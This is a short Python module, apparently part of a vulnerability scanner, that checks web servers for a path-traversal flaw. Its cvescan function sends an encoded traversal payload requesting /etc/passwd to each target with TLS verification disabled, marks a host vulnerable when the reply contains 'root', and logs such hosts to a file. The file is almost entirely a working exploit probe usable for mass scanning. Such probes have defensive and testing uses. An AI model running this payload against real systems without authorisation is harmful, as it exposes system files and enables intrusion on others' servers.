import requests
from includes import write

def cvescan(target,output):
    try:
        res = requests.get(target+ "%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/passwd",verify=False,timeout=5)
        print(f"\n Checking ====> {target}\n")
        resp = res.text
        if "root" in resp and "400 Bad Request" not in resp:
            print("[+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+]")
            outputprint = (f"[Vulnerable] ====> {target}\n")
            print(outputprint)
            print("path traversal vulnerability")
            print("[+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+]")
            if output is not None:
                write.write(output, f"{target}\n")
        else:
            print("its not Vulnerable " + target + "\n")
    except requests.exceptions.RequestException as e:
        print(f"Invalid url => {target}")

